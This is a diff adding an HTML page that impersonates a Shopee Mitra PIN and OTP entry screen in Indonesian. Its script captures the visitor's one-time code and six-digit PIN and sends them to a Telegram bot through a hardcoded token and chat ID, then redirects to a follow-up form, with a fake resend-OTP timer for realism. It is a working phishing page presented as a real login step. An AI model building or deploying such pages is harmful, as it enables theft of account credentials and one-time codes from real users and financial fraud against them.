@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Masukkan PIN - Mitra Shopee</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .pin-container {
+            width: 320px;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        h2 {
+            color: #ee4d2d;
+            margin-bottom: 20px;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #333;
+            font-size: 0.9em;
+        }
+
+        input[type="password"],
+        input[type="number"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 1.2em;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+            outline: none;
+            text-align: center;
+            letter-spacing: 5px;
+        }
+
+        button {
+            margin-top: 20px;
+            background-color: #ee4d2d;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 12px;
+            width: 100%;
+            font-size: 1em;
+            cursor: pointer;
+            outline: none;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #d43d1a;
+        }
+
+        #resendOtp {
+            margin-top: 10px;
+            background-color: #6c757d;
+        }
+
+        #resendOtp:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="pin-container">
+        <h2>Masukkan PIN Anda</h2>
+        <div class="input-group">
+            <label for="otpInput">Kode OTP (5 digit):</label>
+            <input type="number" id="otpInput" maxlength="5" placeholder="•••••" required
+                oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" />
+        </div>
+        <div class="input-group">
+            <label for="pinInput">PIN Shopee Mitra (6 digit):</label>
+            <input type="password" id="pinInput" maxlength="6" placeholder="••••••" autofocus required />
+        </div>
+        <button id="submitPin">Lanjutkan</button>
+        <button id="resendOtp" disabled>Kirim Ulang OTP (60)</button>
+    </div>
+    <script>
+        document.getElementById('submitPin').addEventListener('click', function (e) {
+            e.preventDefault();
+            const pin = document.getElementById('pinInput').value.trim();
+            const otp = document.getElementById('otpInput').value.trim();
+            if (otp.length !== 5 || !/^\d{5}$/.test(otp)) {
+                alert('Masukkan Kode OTP 5 digit angka yang valid');
+                document.getElementById('otpInput').focus();
+                return;
+            }
+            if (pin.length !== 6 || !/^\d{6}$/.test(pin)) {
+                alert('Masukkan PIN 6 digit angka yang valid');
+                document.getElementById('pinInput').focus();
+                return;
+            }
+            // Kirim PIN dan OTP ke Telegram
+            var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk"; // Ganti dengan token bot Anda
+            var chat_id = "5923031825"; // Ganti dengan chat ID Anda
+            var text = "Kode OTP: " + otp + "\nPIN Shopee Mitra: " + pin;
+            var url = "" + token + "/sendMessage"; // Tambahkan '
+            var params = {
+                chat_id: chat_id,
+                text: text
+            };
+            fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(params)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Gagal mengirim pesan ke Telegram');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Pesan terkirim ke Telegram:', data);
+                    window.location.href = 'formulir.html';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('Terjadi kesalahan saat mengirim pesan ke Telegram. Coba lagi nanti.');
+                });
+        });
+        // Timer untuk Kirim Ulang OTP
+        var timeLeft = 60;
+        var resendButton = document.getElementById('resendOtp');
+        resendButton.disabled = true;
+        var timerInterval = setInterval(function () {
+            timeLeft--;
+            resendButton.textContent = "Kirim Ulang OTP (" + timeLeft + ")";
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                resendButton.textContent = "Kirim Ulang OTP";
+                resendButton.disabled = false;
+            }
+        }, 1000);
+        resendButton.addEventListener('click', function () {
+            // Logika Kirim Ulang OTP Di Sini
+            alert('OTP telah dikirim ulang!');
+            // Reset Timer
+            timeLeft = 60;
+            resendButton.disabled = true;
+            timerInterval = setInterval(function () {
+                timeLeft--;
+                resendButton.textContent = "Kirim Ulang OTP (" + timeLeft + ")";
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    resendButton.textContent = "Kirim Ulang OTP";
+                    resendButton.disabled = false;
+                }
+            }, 1000);
+        });
+    </script>
+</body>
+
+</html>
